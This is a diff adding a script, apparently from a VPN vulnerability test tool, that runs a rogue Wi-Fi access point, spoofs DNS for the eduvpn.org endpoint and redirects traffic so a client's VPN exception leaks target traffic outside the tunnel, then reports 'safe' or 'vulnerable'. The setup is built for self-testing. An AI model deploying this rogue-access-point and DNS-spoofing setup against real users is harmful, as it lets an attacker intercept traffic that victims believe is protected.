@@ -1,0 +1,55 @@
+(*
+ * Serverip state machine definition
+ * We pretend the IP address of the vpn endpoint equals that of our target.
+ * Then, we redirect vpn traffic to the real vpn endpoint, rather than the target.
+ * We abuse the fact that most vpn clients allow traffic to the vpn endpoint to flow directly.
+ *)
+
+state init begin:
+  miscnet = miscnet();
+  netmask = "255.255.255.0";
+  my_ip = "192.168.137.1";
+  (* we want target_ip to flow outside of the tunnel *)
+  target_ip = miscnet.lookup_ipv4("vvts.midnightblue.nl");
+
+  (* perform nat on the interface where our default gateway is at *)
+  miscnet.masquerade("true");
+  (* blanket redirect all traffic destined for our target to the vpn endpoint *)
+  miscnet.set_redirect("vvts.midnightblue.nl", "www.eduvpn.org");
+  (* make an exception for the traffic we are actually interested in *)
+  miscnet.no_redirect("tcp://vvts.midnightblue.nl:8443");
+
+  ap = accesspoint();
+  ap.wifi_interface = "wlan0";
+  ap.ipv4_addr = my_ip;
+  ap.ipv4_netmask = netmask;
+  ap.dhcp4_enable = "true";
+  ap.dhcp4_dns = my_ip;
+  ap.dhcp4_router = my_ip;
+  ap.dns_enable = "true";
+  (* spoof dns and tell the victim that the vpn endpoint is located at the target *)
+  ap.dns_set_override("eduvpn.org", target_ip);
+  ap.dns_set_override("www.eduvpn.org", target_ip);
+  ap.bring_up(ap_up, ap_err);
+
+state ap_err:
+  exit("failed to bring up access point: ", errstr);
+
+state ap_up:
+  mon = trafficmonitor();
+  mon.interface = ap.ap_interface;
+  (* make sure validation_server resolves to target_ip *)
+  mon.validation_server = "https://vvts.midnightblue.nl:8443/";
+  (* specify vpn endpoints so that the monitor can detect whether vpn traffic occurs *)
+  (* due to dns spoofing, the client believes the vpn endpoints to be at the target *)
+  mon.vpn_endpoints = "tcp://vvts.midnightblue.nl:443;udp://vvts.midnightblue.nl:443";
+  mon.detect_attack(vpn_safe, vpn_vuln, mon_err);
+
+state mon_err:
+  exit("Error occurred: ", errstr);
+
+state vpn_safe:
+  exit("Your vpn appears to be safe, congratulations!");
+
+state vpn_vuln:
+  exit("Your vpn appears to be vulnerable!");
